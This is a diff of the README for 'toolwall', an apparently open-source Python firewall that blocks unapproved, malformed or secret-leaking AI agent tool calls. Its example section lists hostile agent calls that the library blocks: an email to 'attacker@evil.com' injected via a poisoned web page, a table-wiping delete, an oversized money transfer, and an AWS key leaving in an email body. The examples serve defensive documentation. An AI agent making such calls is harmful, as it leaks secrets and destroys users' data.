@@ -3,73 +3,114 @@
 [![PyPI version](https://img.shields.io/pypi/v/toolwall.svg)](https://pypi.org/project/toolwall/)
 [![Python versions](https://img.shields.io/pypi/pyversions/toolwall.svg)](https://pypi.org/project/toolwall/)
 [![License: MIT](https://img.shields.io/pypi/l/toolwall.svg)](toolwall/LICENSE)
-[![Tests](https://img.shields.io/badge/tests-85%20passing-brightgreen.svg)](toolwall/tests)
+[![Tests](https://img.shields.io/badge/tests-97%20passing-brightgreen.svg)](toolwall/tests)
 [![Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](toolwall/pyproject.toml)
 [![Failure suite](https://img.shields.io/badge/attack%20suite-24%2F24%20blocked-brightgreen.svg)](gate-suite/results/REPORT.md)
 
-> **Fail-closed firewall for AI agent tool calls.**
-> Structured outputs guarantee your agent's tool calls are *well-formed*. toolwall guarantees they're *allowed*.
+> ## The security gateway for AI agent tool calls.
+>
+> Your LLM can generate a **valid** tool call. That doesn't mean it's **safe** to execute.
 
-**Status: v0.2.2 (alpha) · [on PyPI](https://pypi.org/project/toolwall/) · Phase 0 + Phase 1 complete · 85 tests · published failure suite.**
+**Status: v0.3.0 (alpha) · [on PyPI](https://pypi.org/project/toolwall/) · 97 tests · published attack suite.**
 
 ```bash
 pip install toolwall
 ```
 
+```python
+from toolwall import ToolWall, Policy, ToolSchema
+
+wall = ToolWall()   # default-deny, secret detection + audit on
+wall.register("delete_user", delete_user,
+              schema=ToolSchema(required=["user_id"]),
+              policy=Policy(require_approval=True))
+
+result = wall.call("delete_user", {"user_id": "123"})
+
+# result.needs_approval -> True   (held; a human must say yes before it runs)
+# result.reason         -> "approval required for 'delete_user'"
+```
+
+The tool never ran. Every decision is in the audit log.
+
 ---
 
-## The problem
+## The problem nobody guards
 
-Constrained decoding solved malformed JSON. It did nothing for this:
+Constrained decoding and JSON schemas guarantee your agent's tool calls are
+*well-formed*. Nothing guarantees they're *allowed*:
 
 ```python
 delete_records(filter={})            # perfectly valid JSON. whole table gone.
-send_email(to="attacker@evil.com")   # address injected via a poisoned web page
-db_query(limit=10_000_000)           # schema-valid. production melts.
+send_email(to="attacker@evil.com")   # recipient injected via a poisoned web page
+transfer_money(amount=999999999)     # schema-valid. every field the right type.
+db_query(limit=10_000_000)           # production melts.
 ```
 
-Every one of these is a **valid-but-wrong** call. Nothing in the platform stack blocks it.
+Every one of these passes schema validation. Structured outputs, JSON schema,
+and content moderation all wave them through. The failure mode is **valid-but-wrong**,
+and it lives in the gap between "the LLM produced output" and "the tool ran."
 
-## What toolwall does
+toolwall is the fail-closed checkpoint in that gap.
 
 ```
-LLM tool call (OpenAI / Anthropic / Gemini native JSON, no custom format)
+   agent tool call (OpenAI / Anthropic / Gemini native JSON, or a plain dict)
         │
         ▼
-   ┌─ toolwall ────────────────────────────────┐
-   │  registered tool?  schema ok?  policy ok? │──BLOCK──► logged, never executed
-   └───────────────┬───────────────────────────┘
-                   ▼ ALLOW
-              tool(**args)
+   ┌─ toolwall ─────────────────────────────────────────────┐
+   │  known tool?  schema?  policy?  secrets?  budget?       │──BLOCK──► logged, never runs
+   └───────────────────────────┬────────────────────────────┘
+                               ▼ ALLOW
+                          your tool runs
 ```
+
+## What it stops (real attacks, real output)
+
+**A destructive call with no guardrail:**
 
 ```python
-from toolwall import Gate, Meter, Policy, Shield, ToolSchema, in_range, not_empty
-
-gate = Gate(default="deny", meter=Meter(), shield=Shield(mode="block"))
-gate.register("db_query", db_query,
-              schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
-              policy=Policy(constraints={"limit": in_range(1, 100)}))
-gate.register("delete_records", delete_records,
-              schema=ToolSchema(required=["filter"], types={"filter": dict}),
-              policy=Policy(constraints={"filter": not_empty}, require_approval=True))
-gate.budget(max_calls=20)
-
-result = gate.run(openai_response)   # any provider shape, or a plain dict
-# result.verdict: ALLOW | BLOCK | NEEDS_APPROVAL. Only ALLOW executes.
+wall.call("delete_records", {"filter": {}})
+# BLOCKED: policy violation: arg 'filter' rejected by not_empty
 ```
 
-- **Zero required dependencies**: stdlib only, drops into any Python agent
-- **Fail-closed**: unknown tool, schema violation, policy violation, budget hit, unparseable payload: blocked
-- **Policy engine**: value constraints, cross-arg rules, human-approval flags, budget caps
-- **Shield**: secret detection (AWS/OpenAI/GitHub/Stripe/JWT/PEM patterns + entropy) blocks exfil through tool args; audit log never contains the value
-- **Audit trail**: every verdict exported to JSON/CSV (`toolwall report audit.json`)
+**A secret leaving through a tool argument:**
 
-**Current proof:** the published suite blocks **24/24 attack cases across 9 classes
+```python
+wall.call("send_email", {"to": "ops@ourco.com", "body": "aws key AKIA..."})
+# BLOCKED: secret detected (aws-access-key) in arg 'body'
+```
+
+**An out-of-range value:**
+
+```python
+wall.call("db_query", {"q": "everything", "limit": 10_000_000})
+# BLOCKED: policy violation: arg 'limit' rejected by in_range(1, 100)
+```
+
+**A tool the agent was never granted:**
+
+```python
+wall.call("run_shell", {"cmd": "..."})
+# BLOCKED: unknown tool: 'run_shell'
+```
+
+Everything that isn't explicitly allowed is blocked. That is the whole idea.
+
+## Features
+
+- **Fail-closed by default**: unknown tool, bad schema, policy violation, budget hit, or unparseable payload all block *before* the tool runs. Registration is the allowlist.
+- **Policy engine**: value constraints (`in_range`, `one_of`, `matches`, `ends_with`), cross-argument rules, human-approval flags, and budget caps (per run / per tool / USD).
+- **Secret detection**: AWS, OpenAI, GitHub, Stripe, Slack, JWT, PEM, and high-entropy strings caught in tool arguments and blocked or redacted. The audit log never stores the value.
+- **Dry-run**: run your whole agent with nothing executing, then read what it *would* have done and generate a starter policy from it.
+- **MCP guard**: put the same gate in front of any MCP server.
+- **Audit trail**: every verdict exported to JSON/CSV.
+- **Zero required dependencies**: stdlib only, Python 3.10+.
+
+**Proof, not promises:** the published suite blocks **24/24 attack cases across 9 classes
 with 0 false blocks** on clean traffic, at p95 0.07 ms overhead
-([full report](gate-suite/results/REPORT.md), run it yourself: `python gate-suite/run_suite.py`).
-Detection is pattern + entropy based and is never 100%; the report states exactly
-what is and is not proven.
+([full report](gate-suite/results/REPORT.md), reproduce with `python gate-suite/run_suite.py`).
+Secret detection is pattern + entropy based and is never 100%; the report states exactly
+what is and is not proven. **Try to break it. Issues and PRs welcome.**
 
 ## How to use
 
@@ -79,36 +120,42 @@ what is and is not proven.
 pip install toolwall
 ```
 
-### 2. Wire the gate in front of your tools
+### 2. Wrap your tools in a ToolWall
 
 ```python
-from toolwall import Gate, Shield, ToolSchema, Policy, not_empty
+from toolwall import ToolWall, Policy, ToolSchema, in_range, not_empty
 
-gate = Gate(default="deny", shield=Shield(mode="block"))
-gate.register(
-    "delete_records", delete_records,
-    schema=ToolSchema(required=["filter"], types={"filter": dict}),
-    policy=Policy(constraints={"filter": not_empty}),
-)
+wall = ToolWall()   # default-deny, secret detection + audit on
+wall.register("db_query", db_query,
+              schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
+              policy=Policy(constraints={"limit": in_range(1, 100)}))
+wall.register("delete_records", delete_records,
+              schema=ToolSchema(required=["filter"], types={"filter": dict}),
+              policy=Policy(constraints={"filter": not_empty}, require_approval=True))
+wall.budget(max_calls=20)
 
-print(gate.run({"name": "delete_records", "args": {"filter": {}}}).verdict)        # block (empty filter)
-print(gate.run({"name": "delete_records", "args": {"filter": {"id": 5}}}).verdict) # allow
-print(gate.run({"name": "hacked_tool", "args": {}}).verdict)                        # block (unknown tool)
+r = wall.call("db_query", {"q": "open tickets", "limit": 5})   # r.allowed, runs
+r = wall.call("delete_records", {"filter": {}})                # r.blocked, r.reason
+
+# already have an LLM response object? gate it directly:
+results = wall.guard(openai_response)   # OpenAI / Anthropic / Gemini shapes
 ```
 
-`gate.run(x)` accepts an OpenAI / Anthropic / Gemini response object or a plain
-`{"name", "args"}` dict. Only an `ALLOW` verdict executes the tool.
+Only an `ALLOW` verdict executes the tool. `Gate` is the lower-level primitive
+underneath if you want to compose it yourself.
 
 ### 3. Start in dry-run: see what your agent would do, before it does anything
 
 ```python
-from toolwall import Gate, Meter, suggest_policies
+from toolwall import suggest_policies
 
-gate = Gate(default="deny", dry_run=True, meter=Meter())
+wall = ToolWall()
+# ... register your tools, then ...
+wall.dry_run = True
 # ... run your agent as usual; ALLOW calls are simulated, never executed ...
-print(gate.report())            # verdict counts, blocked reasons, secrets caught
-print(suggest_policies(gate))   # a draft schema + policy from the calls observed, for you to review
-gate.meter.export("audit.json", "audit.csv")
+print(wall.report())            # verdict counts, blocked reasons, secrets caught
+print(suggest_policies(wall.gate))   # a draft policy from the calls observed, for you to review
+wall.export("audit.json", "audit.csv")
 ```
 
 This is the safest way to try toolwall on a real agent: nothing executes, and you
@@ -117,8 +164,8 @@ get a report of what it *would* have done plus a starter policy.
 ### 4. Guard an MCP server
 
 ```python
-from toolwall import Gate, MCPGuard
-guard = MCPGuard(gate, forward=call_downstream_mcp_server)
+from toolwall import MCPGuard
+guard = MCPGuard(wall.gate, forward=call_downstream_mcp_server)
 decision = guard.handle(tool_name, args)   # only ALLOW is forwarded; blocks return an MCP error
 ```
 
